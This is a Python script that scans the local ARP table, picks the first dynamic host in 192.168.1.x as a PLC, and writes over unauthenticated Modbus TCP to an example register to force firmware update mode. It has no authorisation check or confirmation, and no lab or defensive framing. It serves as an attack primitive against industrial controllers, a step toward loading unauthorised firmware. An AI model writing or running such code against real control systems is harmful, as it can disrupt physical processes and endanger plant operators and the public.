import socket
import subprocess
import pymodbus
from pymodbus.client import ModbusTcpClient

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Use ARP scan to find devices on the network
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'dynamic' in line:
            ip = line.split()[0]
            # Check if the IP is in the expected range (e.g., 192.168.1.x)
            if ip.startswith('192.168.1.'):
                return ip
    return None

# Function to activate firmware update mode on the PLC
def activate_firmware_update_mode(plc_ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip)
        if not client.connect():
            print(f"Failed to connect to PLC at {plc_ip}")
            return

        # Define the register address for firmware update mode (example: 0x0001)
        firmware_update_mode_register = 0x0001

        # Write a value to the register to activate firmware update mode
        # Example: Write 1 to activate, 0 to deactivate
        client.write_register(firmware_update_mode_register, 1)

        print(f"Firmware update mode activated on PLC at {plc_ip}")

        # Close the connection
        client.close()
    except Exception as e:
        print(f"Error: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        # Activate firmware update mode
        activate_firmware_update_mode(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()